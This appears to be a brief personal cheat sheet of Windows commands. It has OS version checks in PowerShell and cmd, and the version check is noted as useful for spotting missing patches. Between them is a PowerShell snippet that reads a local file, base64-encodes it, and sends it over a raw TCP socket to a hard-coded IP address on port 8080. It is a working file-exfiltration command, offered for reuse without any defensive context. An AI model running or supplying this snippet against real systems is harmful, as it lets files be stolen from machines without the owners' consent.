# Useful Commands

## Powershell

- `[Environment]::OSVersion` - Check Windows OS Version (Useful to check patches)

```
$test=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\test"));
$socket = New-Object net.sockets.tcpclient('172.26.4.26',8080);
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($test);
$socket.close()
```

## Cmd

- `winver` - Check Windows OS Version.